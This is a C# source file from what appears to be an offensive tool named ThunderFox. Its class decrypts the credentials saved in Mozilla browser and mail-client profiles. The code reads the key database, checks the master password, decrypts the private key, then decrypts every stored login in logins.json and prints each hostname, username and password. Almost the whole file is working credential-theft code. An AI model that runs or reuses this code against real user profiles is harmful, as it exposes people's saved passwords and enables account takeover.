using System;
using System.Management;
using System.Data;
using System.Security.Cryptography;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;
using SQLite;
using Microsoft.Win32;
using System.Linq;

namespace ThunderFox
{
    class MozillaCreds
    {
        public static void ExtractCredentials(string loginsJsonPath, string keyDBPath, string masterPassword)
        {
            if (!File.Exists(loginsJsonPath))
            {
                return;
            }

            if (!File.Exists(keyDBPath))
            {
                return;
            }

            // Prep ASN parser
            Asn1Der asn = new Asn1Der();

            bool someResults = false;
            SQLiteConnection database = null;

            try
            {
                database = new SQLiteConnection(keyDBPath, SQLiteOpenFlags.ReadOnly, false);

            }
            catch (Exception e)
            {
                Console.WriteLine("[X] {0}", e.InnerException.Message);
                return;
            }

            string query = "SELECT item1,item2 FROM metadata WHERE id = 'password';";
            List<SQLiteQueryRow> results = database.Query2(query, false);

            foreach (SQLiteQueryRow row in results)
            {
                // Global salt - item1
                var globalSalt = (byte[])row.column[0].Value;

                // Parse ASN from item2
                var item2Byte = (byte[])row.column[1].Value;
                Asn1DerObject item2 = asn.Parse(item2Byte);
                string asnString = item2.ToString();

                // Password check

                // Check for pbeWithSha1AndTripleDES-CBC algorithm OID in ASN (1.2.840.113549.1.12.5.1.3)
                // Use to decrypt password-check if found
                if (asnString.Contains("2A864886F70D010C050103"))
                {
                    // Get Entry Salt (password-check)
                    var entrySalt = item2.objects[0].objects[0].objects[1].objects[0].Data;

                    // Get ciphertext (password-check)
                    var cipherText = item2.objects[0].objects[1].Data;

                    // Decrypt password-check ciphertext & check if master password is correct
                    decryptMoz3DES CheckPwd = new decryptMoz3DES(cipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), entrySalt);
                    var passwordCheck = CheckPwd.Compute();
                    string decryptedPwdChk = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
                    
                    if (!decryptedPwdChk.StartsWith("password-check"))
                    {
                        Console.WriteLine("\n[X] Master password is wrong; cannot decrypt credentials.\n");
                        return;
                    }

                }
                // Check for pkcs5 pbes2 algorithm OID in ASN (1.2.840.113549.1.5.13)
                // Use to decrypt password-check if found
                else if (asnString.Contains("2A864886F70D01050D"))
                {
                    // Get Entry Salt (password-check)
                    var entrySalt = item2.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;

                    // Get IV part2 (password-check)
                    var partIV = item2.objects[0].objects[0].objects[1].objects[2].objects[1].Data;

                    // Get ciphertext (password-check)
                    var cipherText = item2.objects[0].objects[0].objects[1].objects[3].Data;

                    // Decrypt password-check ciphertext & check if master password is correct
                    MozillaPBE CheckPwd = new MozillaPBE(cipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), entrySalt, partIV);
                    var passwordCheck = CheckPwd.Compute();
                    string decryptedPwdChk = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);

                    if (!decryptedPwdChk.StartsWith("password-check"))
                    {
                        Console.WriteLine("\n[X] Master password is wrong; cannot decrypt credentials.\n");
                        return;
                    }
                }
                else if (!asnString.Contains("2A864886F70D010C050103") && !asnString.Contains("2A864886F70D01050D"))
                {
                    Console.WriteLine("\n[X] Unrecognized encryption algorithm.\n");
                    return;
                }
                
                database.Close();

                // If master password is correct, proceed to get private key

                try
                {
                    SQLiteConnection keyDatabase = null;
                    keyDatabase = new SQLiteConnection(keyDBPath, SQLiteOpenFlags.ReadOnly, false);

                    // Parse ASN from a11
                    string keyQuery = "SELECT a11,a102 FROM nssPrivate;";
                    List<SQLiteQueryRow> keyResults = keyDatabase.Query2(keyQuery, false);

                    foreach (SQLiteQueryRow keyRow in keyResults)
                    {
                        // Read ASN Value from a11 in nssPrivate
                        var a11Byte = (byte[])keyRow.column[0].Value;
                        Asn1DerObject a11ASNValue = asn.Parse(a11Byte);

                        // Get Entry Salt (privateKey)
                        var keyEntrySalt = a11ASNValue.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;

                        // Get IV part2 (privateKey)
                        var keyPartIV = a11ASNValue.objects[0].objects[0].objects[1].objects[2].objects[1].Data;

                        // Get cipherText (privateKey)
                        var keyCipherText = a11ASNValue.objects[0].objects[0].objects[1].objects[3].Data;

                        // Decrypt private key ciphertext
                        MozillaPBE PrivKey = new MozillaPBE(keyCipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), keyEntrySalt, keyPartIV);
                        var fullprivateKey = PrivKey.Compute();

                        // Trim private key - we only need the first 24 bytes
                        byte[] privateKey = new byte[24];
                        Array.Copy(fullprivateKey, privateKey, privateKey.Length);

                        // Decrypt & print logins
                        decryptLogins(loginsJsonPath, privateKey);

                        keyDatabase.Close();
                    }
                }

                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }

                Console.WriteLine("\n[*] Done.\n");
            }

        }
        public static void decryptLogins(string loginsJsonPath, byte[] privateKey)
        {
            // Decrypt credentials in logins.json using private key
            Asn1Der asn = new Asn1Der();
            Login[] logins = ParseLoginFile(loginsJsonPath);

            if (logins.Length == 0)
            {
                Console.WriteLine("No logins discovered from logins.json\n");
                return;
            }

            foreach (Login login in logins)
            {
                Asn1DerObject user = asn.Parse(Convert.FromBase64String(login.encryptedUsername));
                Asn1DerObject pwd = asn.Parse(Convert.FromBase64String(login.encryptedPassword));

                string hostname = login.hostname;
                string decryptedUser = TripleDESHelper.DESCBCDecryptor(privateKey, user.objects[0].objects[1].objects[1].Data, user.objects[0].objects[2].Data);
                string decryptedPwd = TripleDESHelper.DESCBCDecryptor(privateKey, pwd.objects[0].objects[1].objects[1].Data, pwd.objects[0].objects[2].Data);

                Console.WriteLine("\r\n----- Mozilla Credential -----\r\n");
                Console.WriteLine("Hostname: {0}", hostname);
                Console.WriteLine("Username: {0}", Regex.Replace(decryptedUser, @"[^\u0020-\u007F]", ""));
                Console.WriteLine("Password: {0}", Regex.Replace(decryptedPwd, @"[^\u0020-\u007F]", ""));
            }
        }


        // Login file parsing adapted from SharpWeb (https://github.com/djhohnstein/SharpWeb)
        public static Login[] ParseLoginFile(string path)
        {
            string rawText = File.ReadAllText(path);
            int openBracketIndex = rawText.IndexOf('[');
            int closeBracketIndex = rawText.IndexOf("],");
            string loginArrayText = rawText.Substring(openBracketIndex + 1, closeBracketIndex - (openBracketIndex + 1));
            return ParseLoginItems(loginArrayText);
        }

        public static Login[] ParseLoginItems(string loginJSON)
        {
            int openBracketIndex = loginJSON.IndexOf('{');
            List<Login> logins = new List<Login>();
            string[] intParams = new string[] { "id", "encType", "timesUsed" };
            string[] longParams = new string[] { "timeCreated", "timeLastUsed", "timePasswordChanged" };
            while (openBracketIndex != -1)
            {
                int encTypeIndex = loginJSON.IndexOf("encType", openBracketIndex);
                int closeBracketIndex = loginJSON.IndexOf('}', encTypeIndex);
                Login login = new Login();
                string bracketContent = "";
                for (int i = openBracketIndex + 1; i < closeBracketIndex; i++)
                {
                    bracketContent += loginJSON[i];
                }
                bracketContent = bracketContent.Replace("\"", "");
                string[] keyValuePairs = bracketContent.Split(',');
                foreach (string keyValueStr in keyValuePairs)
                {
                    string[] keyValue = keyValueStr.Split(new Char[] { ':' }, 2);
                    string key = keyValue[0];
                    string val = keyValue[1];
                    if (val == "null")
                    {
                        login.GetType().GetProperty(key).SetValue(login, null, null);
                    }
                    if (Array.IndexOf(intParams, key) > -1)
                    {
                        login.GetType().GetProperty(key).SetValue(login, int.Parse(val), null);
                    }
                    else if (Array.IndexOf(longParams, key) > -1)
                    {
                        login.GetType().GetProperty(key).SetValue(login, long.Parse(val), null);
                    }
                    else
                    {
                        login.GetType().GetProperty(key).SetValue(login, val, null);
                    }
                }
                logins.Add(login);
                openBracketIndex = loginJSON.IndexOf('{', closeBracketIndex);
            }
            return logins.ToArray();
        }
    }
}